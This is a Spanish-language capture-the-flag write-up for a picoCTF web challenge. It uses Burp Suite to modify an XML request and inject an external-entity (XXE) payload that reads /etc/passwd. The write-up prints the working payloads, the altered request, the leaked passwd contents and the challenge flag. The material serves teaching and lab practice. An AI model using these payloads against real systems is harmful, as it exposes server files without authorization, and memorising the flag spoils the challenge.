### Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.
#### Una vez iniciada la instancia del desafío:
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
[Web Portal](http://saturn.picoctf.net:52660/)
### Solución
Una vez iniciada la instancia del reto, hacemos clic en el enlace para acceder al sitio web, donde vemos lo siguiente:

![[Pasted image 20250401214712.png]]

Se revisa el código fuente, pero este no arroja algún indicio de contener la bandera, por lo que se procede a usar la herramienta *Burp Suite*, para poder observar las solicitudes HTTP y ver sí por ahí podemos obtener algo que nos acerque a la bandera, por lo que se inicia BURP en el navegador y se procede a dar clic en los botones de *Details*, los cuales se van almacenando en la siguiente lista:

![[Pasted image 20250401214804.png]]

Se procede a enviar al **Repeater**, la tercera solicitud, donde nos encontramos con lo siguiente:

```xml
POST /data HTTP/1.1
Host: saturn.picoctf.net:52660
Content-Length: 133
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:52660
Referer: http://saturn.picoctf.net:52660/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
	<data>
		<ID>
			3
		</ID>
	</data>
```

Se hacen pruebas y se determina que solo se pude enviar números entre 1 y 3, ya que mayores o menores a ese rango nos arroja una solicitud inválida, por lo que se pide a ChatGPT que muestre algunos ejemplos de payloads, siendo este primero, uno para una prueba de referencia a una entidad externa:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe "XXE Works!">
]>
<root>
  <data>&xxe;</data>
</root>

```

El siguiente es para la lectura para archivos sensibles:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>

```

Es este justamente el que se termina implementando en la solicitud HTTP que se está manipulando, quedando en lo siguiente:

```xml
POST /data HTTP/1.1
Host: saturn.picoctf.net:52660
Content-Length: 133
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:52660
Referer: http://saturn.picoctf.net:52660/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
	<data>
		<ID>
			&xxe;
		</ID>
	</data>
```

Por lo que se vuelve a reenviar una vez que se termino de modificar, arrojando la siguiente respuesta:

```xml
HTTP/1.1 200 OK
Server: Werkzeug/2.3.6 Python/3.8.10
Date: Wed, 02 Apr 2025 03:46:11 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1023
Connection: close

Invalid ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}
```

Es en el último renglón donde podemos apreciar la bandera que soluciona el reto:

```
picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}
```
### Notas Adicionales

### Referencias
